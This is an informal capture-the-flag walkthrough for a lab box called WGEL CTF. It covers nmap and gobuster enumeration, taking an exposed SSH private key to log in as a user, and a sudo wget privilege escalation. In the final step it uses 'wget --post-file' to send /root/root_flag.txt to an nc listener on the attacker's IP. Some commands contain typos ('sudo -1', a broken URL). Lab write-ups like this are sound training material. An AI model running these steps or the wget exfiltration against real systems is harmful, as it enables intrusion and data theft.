# WGEl CTF To solve it 
1) nmap scanning 
	[nmap -sV 10.10.125.255 <=put ip address]

then you'll see ssh open on port 22
deploy the provided ipt from the machine and try to understand something

2)go for gobuster 
	[sudo gobuster dir -u http://10.10.125.255/ -w /usr/share/dirb/wordlists/common.txt]

then you wont get anything useful, but we have some thing good like 'sitemap'so
agin go for gobuster search file download

3)go agin for gobuster search
	[sudo gobuster dir -u http://10.10.125.255/sitemap/ -w /usr/share/dirb
wo	rdlists/common.txt]
wow amazing we found the '.ssh' so we gonna search ' IP/sitemap/.ssh/' on browser,
then we will fing "id_rsa" and we gona click on it and open then Copying those
encoded valuse and saving it on our machine and try to see what that file mean

**** may be on new tab

4)write and save the file we copied from browser as key 
	[vi id_rsa]

5)we gonna give access 
	[sudo chmod 600 id_rsa]

6)now trying to get into the we have got from source page as 'jessie' as user
	[sudo ssh -i id_rsa jessie@10.10.125.255]
WOW! now we are a user

7) let see current working directory
	[pwd]

8)let see what is inside of it
	[ls
	ls -la	uname -a]

9) let's try to search user related fiels
	 [find / -type f -name "user*" 2>/dev/null]

WOW! we've got it this '/home/jessie/Documents/user_flag.txt'

10)let see what is inside of it

	[cat //home/jessie/Documents/user_flag.txt]

HAHAHO! we found first answer

11) now let try to find next answer 
	 [sudo -1]
   we got some useful information this 'User jessie may run the following commands
   on CorpOne:
      (ALL : ALL) ALL
        (root) NOPASSWD: /usr/bin/wget
      '
so , now on other tab comand [nc -lvp 4545]

12)so then we gona use post method and try to download the answer
	[sudo /usr/bin/wget --post-file=/root/root_flag.txt http:/
10.9.152.133:4545]
remember we gona use machine ip.
